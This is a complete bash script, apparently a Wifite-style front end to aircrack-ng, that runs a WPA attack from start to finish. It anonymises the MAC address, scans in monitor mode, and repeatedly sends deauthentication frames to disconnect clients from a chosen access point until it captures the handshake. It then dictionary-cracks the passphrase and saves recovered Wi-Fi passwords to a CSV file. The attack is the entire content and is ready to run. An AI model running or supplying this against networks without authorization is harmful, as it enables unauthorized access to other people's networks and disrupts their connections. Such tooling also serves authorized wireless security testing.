#!/bin/bash

################################
# GLOBAL VARIABLES IN ALL CAPS #
################################

# Basic console colors
W="\033[0m"   # white (normal)
R="\033[31m"  # red
G="\033[32m"  # green
O="\033[33m"  # orange
B="\033[34m"  # blue
P="\033[35m"  # purple
C="\033[36m"  # cyan
GR="\033[37m" # gray
D="\033[2m"   # dims current color. {W} resets.
# Helper string replacements
X=${W}${D}[${W}${G}+${W}${D}]${W}  # [+]
Y=${W}${D}[${W}${R}!${W}${D}]${W}  # [!]
Z=${W}${D}[${W}${C}?${W}${D}]${W}  # [?]

###################
# DATA STRUCTURES #
###################

confirm_run_as_root(){
    if [ $UID -ne 0 ]
    then
        usage
        echo ""
        echo -e "${Y} Program must be run as ${O}root${W}" 1>&2
        echo ""
        exit 1
    fi
}

usage(){
cat << EOF
Usage: $(basename $0) [options]

Options:
EOF

cat << EOF | column -s\& -t
-d|--dict & Specificy dictionary to use when cracking WPA.
-m|--mac & Change wireless's mac address with an anonymize mac.
-c|--channel & Channel to scan for targets.
-h|--help & Display Help
EOF

cat << EOF

Examples:
sudo ./$(basename $0) --dict wordlist.txt --mac
EOF
}

program_exist(){
    if [ ! `which iwconfig` ];then
        echo -e "${Y} Program ${O}iwconfig ${W}not found,you need to install ${C}wireless-tools${W}"
        exit 1
    fi
    if [ ! `which aircrack-ng` ];then
        echo -e "${Y} Program ${O}aircrack-ng ${W}not found,you need to install ${C}aircrack-ng${W}"
        exit 1
    fi
    if [ ! `which ifconfig` ];then
        echo -e "${Y} Program ${O}ifconfig ${W}not found,you need to install ${C}net-tools${W}"
        exit 1
    fi
}

get_iface(){
    ifaces=($(iwconfig 2>/dev/null | grep -E '^[^ ]+ ' | awk '{print $1}'))
    if [ ${#ifaces[@]} -eq 1 ];then
        iface=${ifaces[0]}
    elif [ ${#ifaces[@]} -gt 1 ];then
        j=1
        echo -en "${X} "
        for x in ${ifaces[@]};do
            echo -en "${G}${j}: ${B}${x}${W}\t"
            j=$[$j + 1]
        done
        echo ""
        while true;do
            read -p 'Please select the wireless number: ' iface_num
            [[ ${iface_num} -ge 1 && ${iface_num} -le ${#ifaces[@]} ]] && break
        done
        iface_num=$[${iface_num} - 1]
        iface=${ifaces[iface_num]}
    else
        echo -e "${Y} Could not find any wireless interfaces" 1>&2
        exit 1
    fi
}

stop_monitor_mode(){
    iwconfig ${1} 2>/dev/null | grep -q 'Mode:Monitor'
    if [ $? -eq 0 ];then
        airmon-ng stop ${1} &>/dev/null
        echo ""
        echo -e "${Y} Stop Wireless interface Monitor mode: ${O}${1}${W}"
        echo ""
    fi
}

start_monitor_mode(){
    if [ ${mac_change} ];then
        iface_current_mac=$(printf ${iface_origin_mac::8}:%02X:%02X:%02X \
        $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] | tr [A-Z] [a-z])
        ifconfig ${1} down && ifconfig ${1} hw ether ${iface_current_mac}
        if [ $? -eq 0 ];then
            echo -en "${X} Change ${O}${1}${W}'s MAC from ${P}${iface_origin_mac}${W} to ${C}${iface_current_mac}${W}..."
        fi
        ifconfig ${1} up && echo 'done'
    fi
    airmon-ng start ${1} &>/dev/null && echo -e "${X} Start Wireless interface Monitor mode: ${O}${1}${W}"
}

get_ap_info(){
    ap_channel=$(cat ${temp_dir}/wifite-01.csv | grep ^${ap_bssid} | cut -d ',' -f 4)
    ap_ssid=$(cat ${temp_dir}/wifite-01.csv | grep ^${ap_bssid} \
    | cut -d ',' -f 14 | sed 's/[^0-9a-zA-Z_-]//g')
    expr ${ap_channel} + 0 &>/dev/null
    if [ $? -ne 0 ];then
        while true;do
            read -p 'Please select the ap channel manually: ' ap_channel
            expr ${ap_channel} + 0 &>/dev/null && break
        done
    fi
    if [ -z ${ap_ssid} ];then
        while true;do
            read -p 'Please select the ap ssid manually: ' ap_ssid
            ap_ssid=$(echo ${ap_ssid} | sed 's/[^0-9a-zA-Z_-]//g')
            [ -z ${ap_ssid} ] || break
        done
    fi
}

send_deauth(){
    i=0
    clients=($(cat ${temp_dir}/handshake-01.csv \
        | grep -E ${mac_pattern}.*${mac_pattern} | grep -oE ^${mac_pattern}))
        if [ ${#clients[@]} -gt 0 ];then
            aireplay_cmd=(aireplay-ng --ignore-negative-one --deauth 1 -a)
            for client in ${clients[*]};do
                aireplay_cmd[${#aireplay_cmd[@]}]=${ap_bssid}
                aireplay_cmd[${#aireplay_cmd[@]}]='-c'
                aireplay_cmd[${#aireplay_cmd[@]}]=${client}
                aireplay_cmd[${#aireplay_cmd[@]}]=${iface}
                ${aireplay_cmd[*]} &>/dev/null
                echo -en "\r${X} Sending deauth to ${C}${client}${W}"
                sleep 1
                i=$[$i + 1]
            done
        fi
    if [ ${i} -eq 1 ];then
        echo -en "\n${X} Sending deauth to ${G}${i}${W} client..."
        sleep 10
    elif [ ${i} -gt 1 ];then
        echo -en "\n${X} Sending deauth to ${G}${i}${W} clients..."
        sleep 10
    else
        echo -en "\r${X} Waiting clients to connecting......"
        sleep 1
    fi
}

handshake_check(){
    echo"" | aircrack-ng -a 2 -w - -b ${ap_bssid} ${temp_dir}/handshake-01.cap \
    2>/dev/null | grep -q 'Passphrase not in dictionary'
    if [ $? -eq 0 ];then
        kill -15 ${airodump_pid[0]}
        stop_monitor_mode ${iface}
        apbssid=$(echo ${ap_bssid} | tr ":" "-")
        cap_time=$(date '+%M%S')
        cap_file=${cap_dir}/${ap_ssid}_${apbssid}_${cap_time}
        cp ${temp_dir}/handshake-01.cap ${cap_file}.cap
        if [ -f ${CURRENT_DIR}/cap2hccapx.bin ];then
            [ -x ${CURRENT_DIR}/cap2hccapx.bin ] || chmod 555 ${CURRENT_DIR}/cap2hccapx.bin
            ${CURRENT_DIR}/cap2hccapx.bin ${cap_file}.cap ${cap_file}.hccapx &>/dev/null
        fi
        echo -e "${X} Success!saved as ${C}${cap_file}.cap${W}"
        return 0
    else
        return 1
    fi
}

wpa_aircrack(){
    if [ ${dict_file} ];then
        su ${user} -c "aircrack-ng -a 2 -w ${dict_file} -l \
        ${temp_dir}/wpakey.txt -b ${ap_bssid} ${cap_file}.cap"
    else
        exit 0
    fi
    if [ -f ${temp_dir}/wpakey.txt ];then
        echo ""
        echo -e "${X} Crack success!save key to ${C}${cracked_csv}${W}"
        password=$(cat ${temp_dir}/wpakey.txt)
        echo "${ap_ssid},${apbssid},${password}" >> ${cracked_csv}
    else
        echo -e "${Y} Crack failed!Please select other dictionary to crack"
    fi
}

initialization(){
    confirm_run_as_root
    user=$(who | awk '{print $1}')
    program_exist
    iwconfig 2>/dev/null | grep -E '^[^ ]+ ' | awk '{print $1}' | while read line;do
        stop_monitor_mode ${line}
    done
    temp_dir=$(mktemp -t -d WifiteXXXXXX)
    [ -d ${temp_dir} ] && chmod 777 ${temp_dir}
    cap_dir=${CURRENT_DIR}/handshake
    [ -d ${cap_dir} ] || mkdir -p ${cap_dir}
    cracked_csv=${CURRENT_DIR}/cracked.csv
    [ -f ${cracked_csv} ] || echo "SSID,BSSID,PASSWORD" > ${cracked_csv}
    mac_pattern='([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}'
}

scan_interface(){
    get_iface
    iface_origin_mac=$(ifconfig ${iface} | grep -oE ${mac_pattern})
    [ -n ${iface_origin_mac} ] && start_monitor_mode ${iface}
    sleep 1
    iface=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')
    airodump_cmd=(airodump-ng -a --write-interval 1 -w ${temp_dir}/wifite)
    if [ ${channel} ];then
        airodump_cmd[${#airodump_cmd[@]}]='-c'
        airodump_cmd[${#airodump_cmd[@]}]=${channel}
    fi
    airodump_cmd[${#airodump_cmd[@]}]=${iface}
    ${airodump_cmd[*]}
}

wpa_attack(){
    trap "stop_monitor_mode ${iface} && exit 0" SIGINT
    while true;do
        read -p 'Please select target BSSID to Crack: ' ap_bssid
        echo ${ap_bssid} | grep -oqE ^${mac_pattern}$ && break
    done
    get_ap_info
    airodump_cmd=(airodump-ng -w ${temp_dir}/handshake --write-interval 1 --bssid)
    airodump_cmd[${#airodump_cmd[@]}]=${ap_bssid}
    airodump_cmd[${#airodump_cmd[@]}]='-c'
    airodump_cmd[${#airodump_cmd[@]}]=${ap_channel}
    airodump_cmd[${#airodump_cmd[@]}]=${iface}
    ${airodump_cmd[*]} &>/dev/null &
    echo -e "${X} Start sending deauth,please waiting..."
    sleep 5
    airodump_pid=($(ps -ef | grep '^root.*airodump-ng' | awk '{print $2}'))
    while true;do
        handshake_check && break
        send_deauth
    done
}

CURRENT_DIR=$(cd `dirname $0`;pwd)
cd ${CURRENT_DIR}

while true;do
    case $1 in
        -d|--dict)
        if [ -r $2 ];then
            dict_file=${CURRENT_DIR}/${2##*/}
        else
            echo -e "${Y} Can't find dictionary,file ${O}${2}${W} don't exist" 1>&2
            echo -e "${Y} Option ${O}${1}${W} must be an exist dictionary file" 1>&2
            exit 1
        fi
        shift;;
        -m|--mac)
        mac_change=0;;
        -c|--channel)
        expr $2 + 0 &>/dev/null
        if [ $? -eq 0 ];then
            [[ $2 -ge 1 && $2 -le 13 ]] && channel=$2
        else
            echo -e "${Y} Option ${O}${1}${W} must be a number between ${G}1-13${W}" 1>&2
            exit 1
        fi
        shift;;
        -h|--help)
        usage
        exit 0;;
        --)
        shift
        break;;
        *)
        shift
        break;;
    esac
    shift
done

initialization
scan_interface
wpa_attack
wpa_aircrack
